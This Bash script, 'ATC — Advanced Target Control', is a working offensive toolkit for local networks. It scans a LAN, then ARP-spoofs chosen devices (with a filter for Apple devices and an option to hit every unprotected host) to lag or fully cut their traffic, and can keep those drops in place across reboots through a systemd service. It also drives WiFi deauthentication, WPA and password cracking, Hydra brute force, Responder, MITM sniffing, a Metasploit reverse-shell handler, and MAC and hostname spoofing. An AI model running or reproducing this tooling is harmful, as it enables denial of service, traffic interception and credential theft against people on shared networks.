#!/usr/bin/env bash
###############################################
# ATC — Advanced Target Control
# Made by Pakun & iinze0
# github.com/brazyqueso
# github.com/brazyqueso/ATC
# Authorized lab / pentest use only
###############################################
set -o pipefail

ATC_VER="1.0.4"
ATC_AUTHOR="Pakun & iinze0"
ATC_GH="https://github.com/brazyqueso"
ATC_REPO="https://github.com/brazyqueso/ATC"

RED='\033[0;31m'; GREEN='\033[0;32m'; YELLOW='\033[1;33m'
CYAN='\033[0;36m'; PURPLE='\033[0;35m'; BOLD='\033[1m'; NC='\033[0m'

if [[ ${EUID} -eq 0 ]]; then
  ATC_HOME="${ATC_HOME:-/var/lib/atc}"
else
  ATC_HOME="${ATC_HOME:-$HOME/.atc}"
fi
mkdir -p "$ATC_HOME" 2>/dev/null || true

LOGFILE="$ATC_HOME/target_control.log"
SAVEFILE="$ATC_HOME/saved_targets.txt"
WHITELIST_FILE="$ATC_HOME/whitelist.txt"
NICKFILE="$ATC_HOME/nicknames.txt"
HOSTFILE="$ATC_HOME/hostnames.txt"
HISTORY_FILE="$ATC_HOME/scan_history.txt"
PERSIST_FILE="/etc/atc_persist.conf"
SERVICE_FILE="/etc/systemd/system/atc-persist.service"

IFACE=""; TARGET=""; TARGETS=(); WHITELIST=(); SCANNED=()
GATEWAY=""; MY_IP=""; CURRENT_ATTACK="None"

declare -A NICKS
declare -A HOSTNAMES
declare -A MACS

need() {
    if ! have "$1"; then
        echo -e "${RED}[!] $1 not installed${NC}"
        return 1
    fi
}

lan_cidr() {
    ip -4 -o addr show dev "$IFACE" 2>/dev/null | awk '{print $4}' | head -n1
}

remember_ip() {
    local ip="$1" host="$2" mac="$3"
    valid_ip "$ip" || return
    [[ "$ip" == "0.0.0.0" || "$ip" == "255.255.255.255" ]] && return
    [[ ! " ${SCANNED[*]} " =~ " $ip " ]] && SCANNED+=("$ip")
    if [[ -n $host && $host != "$ip" && $host != "*" && $host != "-" ]]; then
        host="${host%.}"
        HOSTNAMES["$ip"]="$host"
    fi
    if [[ -n $mac && $mac != *Incomplete* ]]; then
        MACS["$ip"]="$mac"
    fi
}

resolve_name() {
    local ip="$1" n=""
    [[ -n ${HOSTNAMES[$ip]} ]] && return
    n=$(getent hosts "$ip" 2>/dev/null | awk '{print $2; exit}')
    if [[ -z $n ]]; then
        n=$(timeout 1 host "$ip" 2>/dev/null | awk '/pointer/{gsub(/\.$/,"",$NF); print $NF; exit}')
    fi
    if [[ -z $n ]] && have avahi-resolve; then
        n=$(timeout 1 avahi-resolve -a "$ip" 2>/dev/null | awk '{print $2; exit}')
    fi
    [[ -n $n && $n != "$ip" ]] && HOSTNAMES["$ip"]="$n"
}

ingest_ips_from_text() {
    local text="$1" ip
    while read -r ip; do
        remember_ip "$ip"
    done < <(echo "$text" | grep -oE '([0-9]{1,3}\.){3}[0-9]{1,3}' | sort -u)
}

scan_from_kernel() {
    local ip mac
    while read -r ip _ _ mac _; do
        [[ $ip == IP ]] && continue
        remember_ip "$ip" "" "$mac"
    done < /proc/net/arp
    while read -r ip _ _ mac rest; do
        remember_ip "$ip" "" "$mac"
    done < <(ip -4 neigh show dev "$IFACE" 2>/dev/null)
}

scan_from_nmap() {
    have nmap || return
    local cidr; cidr=$(lan_cidr)
    [[ -n $cidr ]] || return
    echo -e "  ${CYAN}nmap ping sweep $cidr${NC}"
    local out
    out=$(nmap -sn -n -T4 --max-retries 1 --host-timeout 2s -e "$IFACE" "$cidr" 2>"$ATC_HOME/scan_nmap.err")
    local ip="" mac="" host=""
    while IFS= read -r line; do
        if [[ $line =~ Nmap\ scan\ report\ for\ ([^[:space:]]+)\ \(([0-9.]+)\) ]]; then
            host="${BASH_REMATCH[1]}"; ip="${BASH_REMATCH[2]}"
            remember_ip "$ip" "$host"
        elif [[ $line =~ Nmap\ scan\ report\ for\ ([0-9.]+) ]]; then
            ip="${BASH_REMATCH[1]}"; host=""
            remember_ip "$ip"
        elif [[ $line =~ MAC\ Address:\ ([0-9A-Fa-f:]{17})\ \((.*)\) ]]; then
            mac="${BASH_REMATCH[1]}"
            remember_ip "$ip" "" "$mac"
        fi
    done <<< "$out"
}

scan_from_arpscan() {
    have arp-scan || return
    echo -e "  ${CYAN}arp-scan --localnet${NC}"
    local line ip mac vend
    while IFS=$'\t' read -r ip mac vend; do
        valid_ip "$ip" || continue
        remember_ip "$ip" "" "$mac"
        [[ -n $vend && -z ${HOSTNAMES[$ip]} ]] && HOSTNAMES["$ip"]="$vend"
    done < <(arp-scan --interface "$IFACE" --localnet --plain --quiet 2>"$ATC_HOME/scan_arp.err" || \
             arp-scan --interface "$IFACE" --localnet 2>"$ATC_HOME/scan_arp.err")
}

scan_from_ping() {
    local cidr prefix
    cidr=$(lan_cidr)
    [[ $cidr == */* ]] || return
    prefix="${cidr%.*}"
    prefix="${prefix%.*}"
    # only cheap /24-/16 last-octet sweep for typical home LAN
    local base
    base=$(echo "$MY_IP" | awk -F. '{print $1"."$2"."$3}')
    [[ -n $base && -n $MY_IP ]] || return
    echo -e "  ${CYAN}ping sweep ${base}.0/24${NC}"
    local i
    for i in $(seq 1 254); do
        ping -c 1 -W 1 -I "$IFACE" "${base}.$i" >/dev/null 2>&1 &
        # cap jobs
        if (( i % 40 == 0 )); then wait; fi
    done
    wait
    scan_from_kernel
}

scan_from_bettercap() {
    have bettercap || return
    echo -e "  ${CYAN}bettercap net.probe${NC}"
    stop_bettercap
    local result
    result=$(timeout 18 bettercap -no-colors -iface "$IFACE" -eval \
        "set net.probe.throttle 8; net.probe on; sleep 8; net.show; quit" 2>"$ATC_HOME/scan_bettercap.err") || true
    ingest_ips_from_text "$result"
    local line ip host
    while IFS= read -r line; do
        ip=$(echo "$line" | grep -oE '([0-9]{1,3}\.){3}[0-9]{1,3}' | head -n1)
        valid_ip "$ip" || continue
        host=$(echo "$line" | awk '{print $NF}' | sed 's/│//g;s/┃//g' | xargs)
        [[ $host == *"─"* || $host == "$ip" || -z $host ]] && host=""
        remember_ip "$ip" "$host"
    done <<< "$result"
}

run_full_scan() {
    echo -e "${GREEN}[+] LAN scan on ${BOLD}$IFACE${NC}"
    local cidr; cidr=$(lan_cidr)
    if [[ -z $MY_IP || -z $cidr ]]; then
        echo -e "${RED}[!] $IFACE has no IPv4. Pick a managed interface (not wlan0mon).${NC}"
        echo -e "${YELLOW}    ip -4 addr show $IFACE${NC}"
        ip -4 addr show "$IFACE" 2>/dev/null || true
        return 1
    fi
    echo -e "  me ${GREEN}$MY_IP${NC}  cidr ${GREEN}$cidr${NC}  gw ${GREEN}$GATEWAY${NC}"
    local before=${#SCANNED[@]}
    scan_from_kernel
    scan_from_nmap
    scan_from_arpscan
    scan_from_bettercap
    scan_from_kernel
    if [[ ${#SCANNED[@]} -le 2 ]]; then
        echo -e "${YELLOW}[!] Few hosts — running ping sweep${NC}"
        scan_from_ping
    fi
    local ip
    for ip in "${SCANNED[@]}"; do resolve_name "$ip"; done
    echo
    echo -e "${YELLOW}Devices (${#SCANNED[@]}):${NC}"
    for ip in "${SCANNED[@]}"; do
        echo -ne "  "
        display_device "$ip"
        [[ -n ${MACS[$ip]} ]] && echo -e "       ${PURPLE}${MACS[$ip]}${NC}"
    done
    echo -e "${GREEN}[+] scan done  (was $before, now ${#SCANNED[@]})${NC}"
    log_action "scan iface=$IFACE found=${#SCANNED[@]}"
    save_all
}


show_banner() {
    [[ -t 1 ]] || return 0
    printf '%b' "${GREEN}${BOLD}"
    cat <<'EOF'

          _____
         |     |
         |_____|
        __|___|__
         / o o \
        |   >   |
         \_____/
     .---/     \---.
    /               \~~
   ~                 ~~

     _  _____  ___
    /_\|_   _|/ __|
   / _ \ | | | (__
  /_/ \_\|_|  \___|

EOF
    printf '%b' "${NC}"
    printf '  %bAdvanced Target Control%b\n' "${GREEN}${BOLD}" "$NC"
    printf '  %bMade by Pakun & iinze0%b\n' "${YELLOW}${BOLD}" "$NC"
    printf '  %b%s%b\n' "$CYAN" "$ATC_REPO" "$NC"
    printf '  %bv%s%b\n\n' "$PURPLE" "$ATC_VER" "$NC"
}

###############################################
# Helpers
###############################################
cleanup() { pkill -f "bettercap" 2>/dev/null; }
trap cleanup EXIT

log_action() { echo "[$(date '+%Y-%m-%d %H:%M:%S')] $1" >> "$LOGFILE"; }

confirm() {
    read -p "$(echo -e "${YELLOW}$1 [y/N]: ${NC}")" ans
    [[ "$ans" =~ ^[Yy]$ ]]
}

valid_ip() { [[ $1 =~ ^[0-9]{1,3}\.[0-9]{1,3}\.[0-9]{1,3}\.[0-9]{1,3}$ ]]; }

pause() { read -p "Press Enter..."; }

have() { command -v "$1" &>/dev/null; }

###############################################
# Dependencies
###############################################
check_dependencies() {
    echo -e "${CYAN}${BOLD}Checking core dependencies...${NC}"
    local missing=()
    for tool in nmap arp-scan ip iptables; do
        if have "$tool"; then echo -e "  ${GREEN}[+] $tool${NC}"
        else echo -e "  ${RED}[-] $tool${NC}"; missing+=("$tool"); fi
    done
    if [[ ${#missing[@]} -gt 0 ]]; then
        if confirm "Install missing core packages?"; then
            apt update -y
            apt install -y bettercap bettercap-caplets bettercap-ui iptables iproute2 \
                nmap tshark arp-scan netdiscover aircrack-ng proxychains4 tor \
                ettercap-text-only ettercap-graphical macchanger whois dnsutils \
                hydra john hashcat metasploit-framework 2>/dev/null
        fi
    fi
}

###############################################
# Data
###############################################
load_data() {
    [[ -f $WHITELIST_FILE ]] && mapfile -t WHITELIST < <(grep -v '^$' "$WHITELIST_FILE" 2>/dev/null)
    [[ -f $SAVEFILE ]] && mapfile -t TARGETS < <(grep -v '^$' "$SAVEFILE" 2>/dev/null)
    [[ -f $HISTORY_FILE ]] && mapfile -t SCANNED < <(grep -v '^$' "$HISTORY_FILE" 2>/dev/null)
    NICKS=(); HOSTNAMES=()
    if [[ -f $NICKFILE ]]; then
        while IFS='=' read -r ip name; do
            ip=$(echo "$ip"|xargs); name=$(echo "$name"|xargs)
            valid_ip "$ip" && [[ -n $name ]] && NICKS["$ip"]="$name"
        done < "$NICKFILE"
    fi
    if [[ -f $HOSTFILE ]]; then
        while IFS='=' read -r ip name; do
            ip=$(echo "$ip"|xargs); name=$(echo "$name"|xargs)
            valid_ip "$ip" && [[ -n $name ]] && HOSTNAMES["$ip"]="$name"
        done < "$HOSTFILE"
    fi
}

save_all() {
    printf "%s\n" "${SCANNED[@]}" > "$HISTORY_FILE"
    printf "%s\n" "${TARGETS[@]}" > "$SAVEFILE"
    printf "%s\n" "${WHITELIST[@]}" > "$WHITELIST_FILE"
    : > "$NICKFILE"; for ip in "${!NICKS[@]}"; do echo "$ip=${NICKS[$ip]}" >> "$NICKFILE"; done
    : > "$HOSTFILE"; for ip in "${!HOSTNAMES[@]}"; do echo "$ip=${HOSTNAMES[$ip]}" >> "$HOSTFILE"; done
}

display_device() {
    local ip="$1"
    echo -ne "  ${CYAN}$ip${NC}"
    [[ -n ${HOSTNAMES[$ip]} ]] && echo -ne "  ${GREEN}[${HOSTNAMES[$ip]}]${NC}"
    [[ -n ${NICKS[$ip]} ]] && echo -ne "  ${YELLOW}(${NICKS[$ip]})${NC}"
    is_protected "$ip" && echo -ne "  ${RED}[protected]${NC}"
    echo
}

is_protected() {
    local ip="$1"
    [[ "$ip" == "$MY_IP" || "$ip" == "$GATEWAY" ]] && return 0
    for w in "${WHITELIST[@]}"; do [[ "$ip" == "$w" ]] && return 0; done
    return 1
}

get_targets_str() {
    if [[ ${#TARGETS[@]} -gt 0 ]]; then local IFS=','; echo "${TARGETS[*]}"
    else echo "$TARGET"; fi
}

check_target() {
    local tstr; tstr=$(get_targets_str)
    if [[ -z $tstr ]]; then echo -e "${RED}[!] No target set${NC}"; sleep 1.2; return 1; fi
}

###############################################
# Attacks
###############################################
stop_bettercap() { pkill -f bettercap 2>/dev/null; sleep 0.4; }

start_spoof() {
    local tstr="$1"
    stop_bettercap
    bettercap -iface "$IFACE" -eval \
        "set arp.spoof.targets $tstr; set arp.spoof.fullduplex true; set arp.spoof.internal true; arp.spoof on" \
        >/dev/null 2>&1 &
    sleep 1.4
}

apply_lag() {
    local ip="$1" delay="$2" loss="$3"
    tc qdisc del dev "$IFACE" root 2>/dev/null
    tc qdisc add dev "$IFACE" root handle 1: prio 2>/dev/null
    tc filter add dev "$IFACE" parent 1: protocol ip prio 1 u32 match ip dst "$ip" flowid 1:1 2>/dev/null
    tc filter add dev "$IFACE" parent 1: protocol ip prio 1 u32 match ip src "$ip" flowid 1:1 2>/dev/null
    tc qdisc add dev "$IFACE" parent 1:1 handle 10: netem delay "${delay}ms" $((delay/5))ms loss "${loss}%" 2>/dev/null
    iptables -I FORWARD -s "$ip" -m limit --limit 25/s --limit-burst 40 -j ACCEPT 2>/dev/null
    iptables -I FORWARD -s "$ip" -j DROP 2>/dev/null
    iptables -I FORWARD -d "$ip" -m limit --limit 25/s --limit-burst 40 -j ACCEPT 2>/dev/null
    iptables -I FORWARD -d "$ip" -j DROP 2>/dev/null
}

full_drop() {
    iptables -I FORWARD -s "$1" -j DROP 2>/dev/null
    iptables -I FORWARD -d "$1" -j DROP 2>/dev/null
}

restore_all() {
    stop_bettercap
    pkill -f mitmproxy 2>/dev/null
    pkill -f ettercap 2>/dev/null
    tc qdisc del dev "$IFACE" root 2>/dev/null
    iptables -F FORWARD 2>/dev/null
    CURRENT_ATTACK="None"
    echo -e "${GREEN}[+] Restored${NC}"
}

enable_persistence() {
    check_target || return
    local tstr; tstr=$(get_targets_str)
    echo "IFACE=$IFACE" > "$PERSIST_FILE"
    echo "TARGETS=$tstr" >> "$PERSIST_FILE"
    cat > "$SERVICE_FILE" << EOF
[Unit]
Description=ATC Persistence
After=network.target
[Service]
Type=oneshot
ExecStart=/bin/bash -c 'source $PERSIST_FILE; for ip in \$(echo \$TARGETS | tr "," " "); do iptables -I FORWARD -s \$ip -j DROP; iptables -I FORWARD -d \$ip -j DROP; done'
RemainAfterExit=yes
[Install]
WantedBy=multi-user.target
EOF
    systemctl daemon-reload
    systemctl enable atc-persist.service
    echo -e "${GREEN}[+] Persistence enabled${NC}"
}

disable_persistence() {
    systemctl disable atc-persist.service 2>/dev/null
    rm -f "$SERVICE_FILE" "$PERSIST_FILE"
    systemctl daemon-reload
    echo -e "${GREEN}[+] Persistence disabled${NC}"
}

###############################################
# Start
###############################################
[[ $EUID -ne 0 ]] && { echo -e "${RED}[!] Run as root:  sudo ATC${NC}"; exit 1; }
check_dependencies
load_data
clear
show_banner

echo -e "${YELLOW}Interfaces:${NC}"
DEF_IFACE=$(ip route | awk '/default/ {print $5; exit}')
mapfile -t IFACES < <(ip -o link show | awk -F': ' '{print $2}' | grep -v lo)
for i in "${!IFACES[@]}"; do
    iface="${IFACES[$i]}"
    extra=""
    [[ $iface == "$DEF_IFACE" ]] && extra=" ${GREEN}(default route)${NC}"
    if [[ $iface == *mon ]]; then
        echo -e "  $((i+1))) ${RED}$iface${NC} ${YELLOW}(monitor — LAN scan will fail)${NC}$extra"
    elif [[ $iface == wlan* || $iface == wl* ]]; then
        echo -e "  $((i+1))) ${GREEN}$iface${NC} ${YELLOW}(Wireless)${NC}$extra"
    else
        echo -e "  $((i+1))) $iface$extra"
    fi
done
echo "  m) Manual"
echo "  [Enter] = default route ($DEF_IFACE)"
read -p "Choice: " choice
if [[ $choice == m || $choice == M ]]; then
    read -p "Interface: " IFACE
elif [[ $choice =~ ^[0-9]+$ ]] && ((choice>=1 && choice<=${#IFACES[@]})); then
    IFACE="${IFACES[$((choice-1))]}"
else
    IFACE="${DEF_IFACE:-eth0}"
fi
[[ -z $IFACE ]] && exit 1

if [[ $IFACE == *mon ]]; then
    echo -e "${YELLOW}[!] Monitor mode has no IPv4. LAN scan needs managed mode (wlan0 / eth0).${NC}"
    sleep 1.5
fi

GATEWAY=$(ip route | grep default | awk '{print $3}' | head -n1)
MY_IP=$(ip -4 addr show "$IFACE" 2>/dev/null | grep -oP '(?<=inet\s)\d+(\.\d+){3}' | head -n1)
if [[ -z $MY_IP ]]; then
    echo -e "${RED}[!] No IPv4 on $IFACE — scan will be empty until you pick a live NIC.${NC}"
    sleep 1.2
fi
[[ -n $MY_IP ]] && ! is_protected "$MY_IP" && WHITELIST+=("$MY_IP")
log_action "Started IFACE=$IFACE MY_IP=$MY_IP"


###############################################
# Menu
###############################################
while true; do
    clear
    echo -e "${GREEN}${BOLD}  ATC${NC}  ${YELLOW}by Pakun \& iinze0${NC}  ${CYAN}v${ATC_VER}${NC}"
    echo -e "  IFACE ${GREEN}$IFACE${NC}  ME ${GREEN}${MY_IP:-?}${NC}  GW ${GREEN}$GATEWAY${NC}"
    echo -e "  Devices ${GREEN}${#SCANNED[@]}${NC}  Attack ${PURPLE}$CURRENT_ATTACK${NC}"
    [[ -n $TARGET ]] && { echo -n "  Target "; display_device "$TARGET"; }
    [[ ${#TARGETS[@]} -gt 0 ]] && echo -e "  Multi ${TARGETS[*]}"
    echo
    echo -e "${YELLOW}Discovery${NC}"
    echo "  1) Scan LAN (nmap+arp+ping)  2) arp-scan   3) netdiscover"
    echo "  4) Show devices             5) Nickname   6) Quick select"
    echo "  7) Apple targets            8) Nmap"
    echo -e "${YELLOW}Targets${NC}"
    echo "  9) Set target              10) Add multi  11) Protect me"
    echo " 12) Clear multi             13) Attack all except protected"
    echo -e "${YELLOW}Lag / Kill${NC}"
    echo " 14) Smart lag (tc)          15) Full kill  16) Timed kill  17) Restore"
    echo -e "${YELLOW}Live${NC}"
    echo " 18) Live traffic (tshark)   19) mitmproxy  20) bettercap sniff"
    echo -e "${YELLOW}WiFi${NC}"
    echo " 21) Monitor mode            22) airodump   23) Deauth"
    echo " 24) Wifite                  25) Airgeddon  26) Hashcat WPA  27) John WPA"
    echo -e "${YELLOW}Bluetooth${NC}"
    echo " 28) bluetoothctl scan       29) l2ping     30) bettercap BLE"
    echo -e "${YELLOW}OSINT${NC}"
    echo " 31) theHarvester            32) Sherlock   33) Whois+DNS"
    echo -e "${YELLOW}Exploit${NC}"
    echo " 34) Metasploit              35) Quick handler  36) Ettercap GUI  37) Ettercap MITM"
    echo " 38) Hydra                   39) NetExec    40) Responder"
    echo -e "${YELLOW}Anonymity${NC}"
    echo " 41) Anonsurf start          42) Anonsurf stop  43) Spoof MAC"
    echo " 44) Random hostname         45) Start Tor      46) Anon test"
    echo " 47) Proxychains cfg         48) Change DNS"
    echo -e "${YELLOW}Persist / System${NC}"
    echo " 49) Enable persist          50) Disable persist"
    echo " 51) iptables                52) Save           53) Log"
    echo "  0) Exit"
    echo
    read -p "  Option: " choice

    case $choice in
        1)
            run_full_scan
            pause
            ;;
        2) have arp-scan && arp-scan --interface "$IFACE" --localnet; pause ;;
        3) have netdiscover && netdiscover -i "$IFACE" ;;
        4) echo; for ip in "${SCANNED[@]}"; do display_device "$ip"; done; pause ;;
        5)
            read -p "IP: " ip
            if valid_ip "$ip"; then read -p "Nickname: " name
                [[ -n $name ]] && NICKS["$ip"]="$name" && save_all && echo -e "${GREEN}Saved${NC}"; fi
            sleep 1 ;;
        6)
            [[ ${#SCANNED[@]} -eq 0 ]] && { echo "No devices"; sleep 1; continue; }
            i=1; for ip in "${SCANNED[@]}"; do printf "  %2d) " $i; display_device "$ip"; ((i++)); done
            read -p "Number: " num
            if [[ $num =~ ^[0-9]+$ ]] && ((num>=1 && num<=${#SCANNED[@]})); then
                sel="${SCANNED[$((num-1))]}"
                if is_protected "$sel"; then echo "Protected"
                else TARGET="$sel"; TARGETS=(); echo -n "Selected "; display_device "$TARGET"; fi
            fi; sleep 1.2 ;;
        7)
            echo -e "${GREEN}[+] Apple / vendor filter from last scan + live probe${NC}"
            run_full_scan
            APPLE=()
            for ip in "${SCANNED[@]}"; do
                blob="${HOSTNAMES[$ip]} ${MACS[$ip]}"
                echo "$blob" | grep -qiE 'apple|iphone|ipad|macbook|airport|icloud' || continue
                is_protected "$ip" && continue
                APPLE+=("$ip")
                display_device "$ip"
            done
            if [[ ${#APPLE[@]} -eq 0 ]]; then
                echo -e "${YELLOW}[!] None matched Apple in names/vendors. Use option 6 to pick manually.${NC}"
            elif confirm "Target these Apple devices?"; then
                TARGETS=("${APPLE[@]}"); TARGET=""
            fi
            sleep 1.2
            ;;
        8) check_target && nmap -sV --top-ports 20 "$(get_targets_str)"; pause ;;
        9)
            read -p "Target IP: " TARGET
            if valid_ip "$TARGET" && ! is_protected "$TARGET"; then TARGETS=(); echo Set
            else TARGET=""; echo "Invalid/protected"; fi; sleep 1 ;;
        10)
            read -p "IP: " ip
            valid_ip "$ip" && ! is_protected "$ip" && TARGETS+=("$ip") && echo Added
            sleep 1 ;;
        11)
            [[ $TARGET == "$MY_IP" ]] && TARGET=""
            new=(); for ip in "${TARGETS[@]}"; do [[ $ip != "$MY_IP" ]] && new+=("$ip"); done
            TARGETS=("${new[@]}"); [[ -n $MY_IP ]] && WHITELIST+=("$MY_IP")
            save_all; echo Protected; sleep 1 ;;
        12) TARGETS=(); echo Cleared; sleep 1 ;;
        13)
            confirm "Attack all non-protected?" || continue
            TARGETS=(); for ip in "${SCANNED[@]}"; do is_protected "$ip" || TARGETS+=("$ip"); done
            echo "${#TARGETS[@]} targets"; sleep 1.3 ;;
        14)
            check_target || continue
            TSTR=$(get_targets_str)
            echo "1) 100ms  2) 300ms  3) 700ms  4) 1500ms"
            read -p "Choice: " c
            case $c in 1) D=100;L=2;N="Light";; 3) D=700;L=8;N="Heavy";; 4) D=1500;L=12;N="Extreme";; *) D=300;L=4;N="Medium";; esac
            start_spoof "$TSTR"
            for ip in ${TSTR//,/ }; do apply_lag "$ip" "$D" "$L"; done
            CURRENT_ATTACK="$N lag"; echo -e "${GREEN}$N lag active${NC}"; pause ;;
        15)
            check_target || continue
            TSTR=$(get_targets_str)
            confirm "FULL KILL $TSTR?" && {
                start_spoof "$TSTR"
                for ip in ${TSTR//,/ }; do full_drop "$ip"; done
                CURRENT_ATTACK="Full Kill"; echo -e "${RED}Kill active${NC}"
            }; pause ;;
        16)
            check_target || continue
            read -p "Minutes: " M; M=${M:-5}
            TSTR=$(get_targets_str)
            start_spoof "$TSTR"
            for ip in ${TSTR//,/ }; do full_drop "$ip"; done
            CURRENT_ATTACK="Timed ${M}m"
            sleep $((M*60)); restore_all; pause ;;
        17) restore_all; sleep 1 ;;
        18)
            check_target || continue
            TSTR=$(get_targets_str)
            echo -e "${GREEN}Live traffic Ctrl+C stop${NC}"
            start_spoof "$TSTR"
            tshark -i "$IFACE" -f "host $TSTR" -Y "http or dns" -T fields \
                -e frame.time -e ip.src -e ip.dst -e http.host -e dns.qry.name 2>/dev/null ;;
        19)
            check_target || continue
            TSTR=$(get_targets_str)
            start_spoof "$TSTR"
            have mitmproxy && mitmproxy --mode transparent --showhost || echo "install mitmproxy" ;;
        20)
            check_target || continue
            TSTR=$(get_targets_str)
            stop_bettercap
            bettercap -iface "$IFACE" -eval "set arp.spoof.targets $TSTR; set arp.spoof.fullduplex true; arp.spoof on; set net.sniff.verbose true; net.sniff on" ;;
        21) have airmon-ng && airmon-ng check kill && airmon-ng start "${IFACE%mon}"; sleep 2 ;;
        22) have airodump-ng && airodump-ng "$IFACE" ;;
        23)
            read -p "BSSID: " BSSID; read -p "Client MAC empty=broadcast: " CLIENT
            read -p "Count [10]: " COUNT; COUNT=${COUNT:-10}
            if have aireplay-ng; then
                [[ -z $CLIENT ]] && aireplay-ng --deauth "$COUNT" -a "$BSSID" "$IFACE" \
                    || aireplay-ng --deauth "$COUNT" -a "$BSSID" -c "$CLIENT" "$IFACE"
            fi; pause ;;
        24) have wifite && wifite || echo "install wifite" ;;
        25) have airgeddon && airgeddon || echo "install airgeddon" ;;
        26)
            read -p "hc22000 file: " H; read -p "Wordlist [/usr/share/wordlists/rockyou.txt]: " W
            W=${W:-/usr/share/wordlists/rockyou.txt}
            have hashcat && hashcat -m 22000 "$H" "$W" --force; pause ;;
        27)
            read -p "cap/hash file: " H; read -p "Wordlist [/usr/share/wordlists/rockyou.txt]: " W
            W=${W:-/usr/share/wordlists/rockyou.txt}
            if have john; then
                if [[ $H == *.cap || $H == *.pcap ]]; then
                    have wpapcap2john && wpapcap2john "$H" > /tmp/wifi.john && john --wordlist="$W" /tmp/wifi.john
                else john --wordlist="$W" "$H"; fi
            fi; pause ;;
        28) have bluetoothctl && { bluetoothctl scan on; sleep 8; bluetoothctl devices; bluetoothctl scan off; }; pause ;;
        29) read -p "BT MAC: " M; have l2ping && l2ping -c 5 "$M"; pause ;;
        30) bettercap -eval "ble.recon on; sleep 10; ble.show; quit"; pause ;;
        31)
            read -p "Domain: " d; read -p "Source [all]: " s; s=${s:-all}
            have theHarvester && theHarvester -d "$d" -b "$s" -l 200 || echo "install theharvester"
            pause ;;
        32) read -p "Username: " u; have sherlock && sherlock "$u" --print-found || echo "install sherlock"; pause ;;
        33)
            read -p "Domain/IP: " t
            echo "=== WHOIS ==="; have whois && whois "$t" | head -40
            echo "=== DNS ==="; have dig && dig "$t" ANY +noall +answer
            pause ;;
        34) have msfconsole && msfconsole || echo "install metasploit" ;;
        35)
            read -p "LHOST [$MY_IP]: " LH; LH=${LH:-$MY_IP}
            read -p "LPORT [4444]: " LP; LP=${LP:-4444}
            have msfconsole && msfconsole -q -x "use exploit/multi/handler; set PAYLOAD linux/x64/meterpreter/reverse_tcp; set LHOST $LH; set LPORT $LP; exploit -j" ;;
        36) have ettercap && ettercap -G || echo "install ettercap-graphical" ;;
        37)
            check_target || continue
            TSTR=$(get_targets_str)
            have ettercap && ettercap -T -q -i "$IFACE" -M arp:remote "/$GATEWAY/" "/$TSTR/" || echo "install ettercap"
            ;;
        38)
            read -p "Target: " HT; read -p "Service ssh/ftp/smb: " SV
            read -p "User: " US; read -p "Passlist [/usr/share/wordlists/rockyou.txt]: " PL
            PL=${PL:-/usr/share/wordlists/rockyou.txt}
            have hydra && hydra -l "$US" -P "$PL" "$HT" "$SV" -V; pause ;;
        39)
            check_target || continue
            TSTR=$(get_targets_str)
            if have nxc; then nxc smb "$TSTR"
            elif have netexec; then netexec smb "$TSTR"
            else echo "install netexec"; fi; pause ;;
        40)
            if have responder; then responder -I "$IFACE" -wd
            elif have Responder; then Responder -I "$IFACE" -wd
            else echo "install responder"; fi; pause ;;
        41) have anonsurf && anonsurf start || echo "install anonsurf"; sleep 2 ;;
        42) have anonsurf && anonsurf stop; sleep 1 ;;
        43)
            read -p "Iface to spoof [$IFACE]: " MI; MI=${MI:-$IFACE}
            ip link set "$MI" down
            if have macchanger; then macchanger -r "$MI"
            else NEW=$(printf '02:%02x:%02x:%02x:%02x:%02x' $((RANDOM%256)) $((RANDOM%256)) $((RANDOM%256)) $((RANDOM%256)) $((RANDOM%256)))
                 ip link set "$MI" address "$NEW"; echo "MAC $NEW"; fi
            ip link set "$MI" up; sleep 1 ;;
        44)
            NH="host-$(tr -dc a-z0-9 </dev/urandom | head -c8)"
            hostnamectl set-hostname "$NH" 2>/dev/null || hostname "$NH"
            echo "$NH" > /etc/hostname; echo "Hostname $NH"; sleep 1 ;;
        45) systemctl restart tor 2>/dev/null || service tor restart; sleep 2; echo Tor; pause ;;
        46)
            echo "Normal: $(curl -s --max-time 5 ifconfig.me 2>/dev/null)"
            echo "Proxy : $(proxychains4 curl -s --max-time 8 ifconfig.me 2>/dev/null || echo fail)"
            pause ;;
        47)
            CONF="/etc/proxychains4.conf"; [[ -f $CONF ]] || CONF="/etc/proxychains.conf"
            echo "1 dynamic  2 strict  3 random"
            read -p "Choice [1]: " ch; ch=${ch:-1}
            case $ch in
                2) sed -i 's/^dynamic_chain/#dynamic_chain/;s/^random_chain/#random_chain/;s/^#strict_chain/strict_chain/' "$CONF" ;;
                3) sed -i 's/^dynamic_chain/#dynamic_chain/;s/^strict_chain/#strict_chain/;s/^#random_chain/random_chain/' "$CONF" ;;
                *) sed -i 's/^strict_chain/#strict_chain/;s/^random_chain/#random_chain/;s/^#dynamic_chain/dynamic_chain/' "$CONF" ;;
            esac
            grep -q "127.0.0.1 9050" "$CONF" || echo "socks5 127.0.0.1 9050" >> "$CONF"
            echo Configured; sleep 1 ;;
        48)
            echo "1 Cloudflare  2 Quad9"
            read -p "Choice [1]: " d
            case $d in 2) echo -e "nameserver 9.9.9.9\nnameserver 149.112.112.112" > /etc/resolv.conf ;;
                       *) echo -e "nameserver 1.1.1.1\nnameserver 1.0.0.1" > /etc/resolv.conf ;; esac
            echo DNS set; sleep 1 ;;
        49) enable_persistence; sleep 2 ;;
        50) disable_persistence; sleep 1 ;;
        51) iptables -L FORWARD -n -v --line-numbers; pause ;;
        52) save_all; echo Saved; sleep 1 ;;
        53) tail -n 40 "$LOGFILE" 2>/dev/null || echo "No log"; pause ;;
        0) save_all; exit 0 ;;
        *) echo Invalid; sleep 1 ;;
    esac
done
